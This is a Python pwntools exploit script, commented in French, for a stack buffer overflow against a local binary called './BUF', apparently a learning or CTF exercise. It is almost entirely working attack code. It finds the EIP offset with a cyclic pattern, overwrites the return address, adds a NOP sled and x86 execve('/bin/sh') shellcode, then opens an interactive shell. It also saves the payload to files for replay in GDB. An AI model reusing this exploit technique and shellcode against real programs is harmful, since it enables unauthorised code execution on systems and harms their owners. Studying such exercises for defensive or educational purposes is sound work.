# EXPLOIT.PY
# ----------
# Pour pwntools en Python V3

from pwn import *

# Prendre sous GDB pour bien comprendre le trick
# GDB -q ./BUF
# GDB : r < padding.bin
# GDB : x/12xw $esp


TAILLE_TAPIS = 32
PATTERN = 'qaac'        # Valeur EIP au moment du SEG FAULT
ADDRESS = 0xffffd09c + TAILLE_TAPIS

# ADDRESS = 0xffffd0bc    # GDB: x/12xw $esp || 0xffffd09c + 32 


proc = process('./BUF')
proc.recvline()

print("\nCrÃ©ation de l'exploit:")

shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3h\x01\x01\x01\x01\x814\x24ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"

offset = cyclic_find(PATTERN) # Renvoi la position dans la pattern Pwntools.Cyclic du contenu de EIP au moment du crash 
padding = b'A' * offset       # Amorce avec un tasso de A (ici 268xA)

f= open("padding.bin","wb") # Juste pour pouvoir declencher le SEG FAULT plus facilement dans GDB plus tard
f.write(padding)
f.close()

eip_cible = p32(ADDRESS + 1) 
tapis_nop = b'\x90' * TAILLE_TAPIS # on rempli notre tapis roulant de NOP pour glisser vers 0xffffd09c (EIP)


shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3h\x01\x01\x01\x01\x814\x24ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"


payload = padding + eip_cible + tapis_nop + shellcode # on construit notre charge utile

print("Payload = ", payload) # j adore voir cette suite d'octets s'afficher ;-)


f= open("payload.bin","wb") # juste pour sauvegarder mon payload dans un fichier pour pouvoir le rejouer en DEBUG plus tard
f.write(payload)
f.close()

proc.send(payload)

proc.interactive()